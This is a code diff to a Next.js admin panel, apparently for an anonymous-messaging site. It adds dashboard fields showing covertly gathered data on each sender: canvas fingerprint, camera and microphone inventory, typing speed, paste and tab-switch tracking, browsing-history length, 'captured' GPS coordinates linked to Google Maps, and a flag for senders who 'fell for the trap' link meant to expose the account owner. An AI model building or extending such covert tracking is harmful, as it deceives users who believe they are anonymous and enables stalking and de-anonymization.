@@ -4,6 +4,17 @@ import { jwtVerify } from "jose";
 import { redirect } from "next/navigation";
 import Link from "next/link";
 
+function extractPhoneModel(ua) {
+  if (!ua) return "";
+  if (/iPhone/i.test(ua)) return " (iPhone)";
+  if (/iPad/i.test(ua)) return " (iPad)";
+  const android = ua.match(/Android [^;]+; ([^;)]+)\)?/);
+  if (android && android[1]) {
+    return " (" + android[1].split(" Build")[0].trim() + ")";
+  }
+  return "";
+}
+
 export default async function AdminPanel() {
   const cookieStore = await cookies();
   const token = cookieStore.get("auth_token")?.value;
@@ -113,12 +124,31 @@ export default async function AdminPanel() {
               <span><strong>المرسل:</strong> {msg.senderName || "مجهول"}</span>
               <span><strong>IP:</strong> {msg.ipAddress}</span>
               <span><strong>الموقع:</strong> {msg.country} - {msg.city}</span>
-              <span><strong>جهاز:</strong> {msg.deviceType}</span>
+              <span><strong>جهاز:</strong> {msg.deviceType}{extractPhoneModel(msg.userAgent)}</span>
               <span><strong>المصدر:</strong> {msg.referrer && msg.referrer !== "Direct" ? msg.referrer : "مباشر"}</span>
               <span><strong>التايم زون:</strong> {msg.timezone || "—"}</span>
-              <span><strong>الوقت المستغرق:</strong> {msg.timeSpent ? `${msg.timeSpent} ثواني` : "—"}</span>
-              <span><strong>التراجعات والمسح:</strong> {msg.backspacesCount ? `${msg.backspacesCount} مرة` : "0"}</span>
-              <span><strong>كود الزائر:</strong> {msg.sessionId || "—"}</span>
+              <span><strong>الوقت:</strong> {msg.timeSpent ? `${msg.timeSpent} ثواني` : "—"}</span>
+              <span><strong>الخروج:</strong> {msg.tabSwitches > 0 ? `${msg.tabSwitches} مرات` : "لا"}</span>
+              <span><strong>النسخ واللصق:</strong> {msg.isPasted ? "نعم" : "لا"}</span>
+              <span><strong>سرعة الكتابة:</strong> {msg.typingSpeed ? `${msg.typingSpeed}CPM` : "—"}</span>
+              <span><strong>شبكة:</strong> {msg.networkType || "—"}</span>
+              <span><strong>تعديلات:</strong> {msg.backspacesCount ? `${msg.backspacesCount} مرة` : "0"}</span>
+              <span><strong>الصفحات السابقة:</strong> {msg.historyLength || "—"}</span>
+              <span><strong>العتاد (كاميرات/مايكات):</strong> {msg.devicesInfo || "—"}</span>
+              <span><strong>كود الدخول:</strong> {msg.sessionId || "—"}</span>
+              <span><strong>بصمة المتصفح الثابتة:</strong> {msg.canvasFingerprint || "—"}</span>
+              
+              {msg.exactLocation && (
+                <span style={{ width: "100%", background: "rgba(16, 185, 129, 0.1)", padding: "0.5rem", borderRadius: "8px", color: "#10b981", border: "1px solid #10b981", marginTop: "0.5rem" }}>
+                  📍 <strong>GPS تم اصطياده:</strong> <a href={`https://www.google.com/maps?q=${msg.exactLocation}`} target="_blank" style={{ textDecoration: "underline", color: "#fff" }}>فتح في Google Maps 🗺️</a>
+                </span>
+              )}
+              
+              {msg.fellForTrap && (
+                <span style={{ width: "100%", background: "rgba(239, 68, 68, 0.2)", padding: "0.5rem", borderRadius: "8px", color: "#fca5a5", border: "1px solid #ef4444", marginTop: "0.5rem" }}>
+                  🚨 <strong>تحذير الفضول:</strong> ضغط على الرابط لمحاولة كشف صاحب الحساب!
+                </span>
+              )}
             </div>
           </div>
         ))}
